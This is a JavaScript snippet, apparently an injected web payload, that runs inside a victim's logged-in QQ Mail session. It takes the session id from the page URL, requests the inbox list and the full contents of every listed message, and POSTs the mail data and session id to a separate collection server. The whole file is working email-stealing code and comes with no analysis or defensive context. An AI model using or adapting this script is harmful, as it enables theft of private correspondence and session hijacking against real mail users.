(function () {
    // page number, from 0 to start, and each page contains 25 mails
    var page = 0;
    // This is the IP address of server that could receive QQ Mail information
    const serverURL = 'http://localhost:4000';
    const mailListAPI = '/QQmailList';
    const mailContentAPI = '/QQmailContent'

    const urlParams = new URL(top.window.location.href);
    const ssid = urlParams.searchParams.get("sid")?.substring(0, 24) || "";
    const listURL = `https://${top.window.location.host}/cgi-bin/mail_list?folderid=1&page=${page}&s=inbox&sid=${ssid}`;
    const contentURL = `https://${top.window.location.host}/cgi-bin/readmail?sid=${ssid}&nocheckframe=true&mailid=`;

    function extractAllMailIds(htmlContent) {
        const parser = new DOMParser();
        const doc = parser.parseFromString(htmlContent, 'text/html');
        const elements = doc.querySelectorAll('[mailid]');
        const mailIds = Array.from(elements)
            .map(el => el.getAttribute('mailid'))
            .filter(value => value && value.trim() !== '');
        return [...new Set(mailIds)];
    }
    const sendMailListXHR = new XMLHttpRequest();
    sendMailListXHR.open("GET", listURL, true);
    sendMailListXHR.onreadystatechange = function () {
        if (sendMailListXHR.readyState === 4 && sendMailListXHR.status === 200) {
            try {
                fetch(serverURL + mailListAPI, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        sid: ssid,
                        mailListData: sendMailListXHR.responseText,
                        timestamp: new Date().toISOString()
                    })
                });
                const mailIds = extractAllMailIds(sendMailListXHR.responseText);
                for(let i = 0; i < mailIds.length; i++)
                    {
                        const sendMailContentXHR = new XMLHttpRequest();
                        // console.log(contentURL + mailIds[i]);
                
                        sendMailContentXHR.open("GET", contentURL + mailIds[i], true);
                        sendMailContentXHR.onreadystatechange = function () {
                            if (sendMailContentXHR.readyState === 4 && sendMailContentXHR.status === 200) {
                                try {
                                    fetch(serverURL + mailContentAPI, {
                                        method: 'POST',
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                        body: JSON.stringify({
                                            sid: ssid,
                                            mailId: mailIds[i],
                                            mailContentData: sendMailContentXHR.responseText,
                                            timestamp: new Date().toISOString()
                                        })
                                    });
                    
                                } catch (e) {
                                    console.error('Failed to send infomation:', e);
                                }
                            }
                        };
                        sendMailContentXHR.send(null);
                    }
            } catch (e) {
                console.error('Failed to send infomation:', e);
            }
        }
    };
    sendMailListXHR.send(null);
})();